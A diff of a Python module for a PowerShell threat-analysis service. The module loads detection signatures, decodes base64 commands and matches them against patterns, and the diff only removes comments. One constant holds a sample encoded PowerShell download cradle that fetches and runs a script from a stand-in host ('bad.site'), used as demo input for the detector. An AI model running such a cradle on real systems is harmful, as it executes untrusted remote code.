@@ -9,13 +9,13 @@ import base64
 from services.session_manager import get_supabase_client
 from config.settings import CACHE_DURATION
 
-# Detector registry - add new detectors in services/detectors/__init__.py
+
 from services import detectors
 
-# Sanitization module for pre-analysis command processing
+
 from services.sanitization import apply_sanitization, get_detected_indicator_names
 
-# ✅ Example command that doesn't count towards quota
+
 EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 
 try:
@@ -42,8 +42,8 @@ async def load_signatures_from_db(user_id: str = None) -> list:
     try:
         now = int(time.time() * 1000)
         
-        # ✅ OPTIMIZATION: Skip premium check if cache is valid
-        cache_key = "signatures_free"  # Default
+       
+        cache_key = "signatures_free"  
         
         is_premium_user = False
         if user_id:
@@ -52,17 +52,17 @@ async def load_signatures_from_db(user_id: str = None) -> list:
             if profile_response.data:
                 is_premium_user = profile_response.data.get('is_premium_user', False)
         
-        # ✅ Update cache key after premium check
+      
         cache_key = f"signatures_{'premium' if is_premium_user else 'free'}"
         
-        # ✅ OPTIMIZATION: Return cached signatures immediately
+        
         if signatures_cache and cache_timestamp and cache_key in signatures_cache and (now - cache_timestamp) < CACHE_DURATION:
             return signatures_cache[cache_key]
         
         supabase = get_supabase_client()
         
         
-        # Query standard signatures
+     
         query = supabase.table('powershell_signatures').select('*').eq('is_active', True)
         
         if not is_premium_user:
@@ -85,15 +85,15 @@ async def load_signatures_from_db(user_id: str = None) -> list:
 
             converted_signatures = []
             for sig in signatures_data:
-                # determine indicator type
+               
                 sig_name = sig.get("name", "Unknown")
                 indicator_type = "community" if sig_name in public_indicator_names else "private"
                 
-                # Construct dynamic GitHub link for community indicators
+               
                 link = None
                 if indicator_type == "community":
                     file_path = sig.get("file_path", "")
-                    # Extract filename from path (e.g., indicators/name.yaml -> name.yaml)
+                    
                     if file_path:
                         filename = file_path.split("/")[-1]
                         link = f"https://github.com/avasero/psexposed/blob/main/indicators/{filename}"
@@ -204,7 +204,7 @@ def decode_powershell(command: str) -> tuple:
                 processing_type = "base64_decoded"
                 successfully_decoded = True
                 
-                # Check for nested encoding
+        
                 has_more_encoding = regex.search(
                     detectors.ENCODED_COMMAND_PATTERN,
                     decoded_payload,
@@ -320,7 +320,7 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
             techniques_set.update(double_encoded_sig.get("techniques", ["T1027.010", "T1140"]))
             total_score += double_encoded_sig["score"]
 
-            # Also add Encoded Command Detected when double encoding is present
+           
             encoding_detection = detectors.detect_encoded_command(raw_command)
             encoded_sig = next((sig for sig in signatures if sig.get("name") == "Encoded Command Detected"), None)
 
@@ -366,17 +366,17 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
 
     commands_set = {raw_command}
 
-    # Only add decoded commands if allowed (user has decode quota available)
+   
     if allow_decoded_analysis:
-        # Add base64 decoded command from decode_powershell
+        
         if decode_iterations >= 1 and fully_decoded and fully_decoded != command:
             commands_set.add(fully_decoded)
 
-        # Add first_decoded from detect_encoded_command (may be different/more complete)
+      
         if first_decoded and first_decoded != command:
             commands_set.add(first_decoded)
 
-        # Add double decoded if available
+        
         if double_decoded:
             commands_set.add(double_decoded)
     else:
@@ -385,7 +385,7 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
     commands_to_analyze = list(commands_set)
     print(f"[ANALYZE] Commands to analyze: {len(commands_to_analyze)} (allow_decoded={allow_decoded_analysis})")
     
-    # ✅ OPTIMIZATION: Pre-filter signatures to skip
+    
     skip_signatures = {"Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected"}
     if has_encoded_command_indicator:
         skip_signatures.add("Long base64 strings")
@@ -399,7 +399,7 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
         matched_in_decoded = False
         
         for cmd_to_test in commands_to_analyze:
-            # Mark as decoded if it's any version other than the original
+           
             is_decoded_version = (cmd_to_test != raw_command)
             
             for pattern in signature["patterns"]:
@@ -487,8 +487,7 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
     
   
    
-    # Only return decoded content if analysis was allowed
-    # This prevents has_decoded_content from being set when limit is reached
+   
     return {
         "detected_signatures": detected_signatures,
         "total_score": total_score,
@@ -516,27 +515,27 @@ def analyze_with_sanitization(command: str, signatures: list, allow_decoded_anal
     Returns:
         dict: Analysis results with sanitization info included
     """
-    # Helper function to extract indicator names from analysis
+
     def get_indicators(cmd: str) -> list[str]:
         result = analyze_command_patterns(cmd, signatures, allow_decoded_analysis)
         return get_detected_indicator_names(result)
 
-    # Apply conditional sanitization
+ 
     sanitization_result = apply_sanitization(command, get_indicators)
 
-    # If sanitization was applied, analyze the sanitized command
+ 
     if sanitization_result["was_sanitized"]:
         final_command = sanitization_result["sanitized_command"]
         analysis_result = analyze_command_patterns(final_command, signatures, allow_decoded_analysis)
 
-        # Add sanitization metadata to the result
+        
         analysis_result["sanitization"] = {
             "was_sanitized": True,
             "original_command": command,
             "applied_methods": sanitization_result["applied_sanitizations"]
         }
     else:
-        # No sanitization needed, analyze original command
+       
         analysis_result = analyze_command_patterns(command, signatures, allow_decoded_analysis)
         analysis_result["sanitization"] = {
             "was_sanitized": False,
@@ -586,15 +585,14 @@ async def save_analysis_to_db(
         
         ip_country = country if country and country != 'Unknown' else None
         
-        # Extract decoded content
+      
         decoded_cmd = analysis_result.get("decoded_command")
         double_decoded_cmd = analysis_result.get("double_decoded_command")
         
-        # ✅ Check if this is the example command
+        
         is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()
         
-        # ✅ NEW: Determine if analysis has actual decoded content
-        # Example command doesn't count towards quota
+       
         has_decoded_content = bool(
             (decoded_cmd or double_decoded_cmd) and not is_example_command
         )
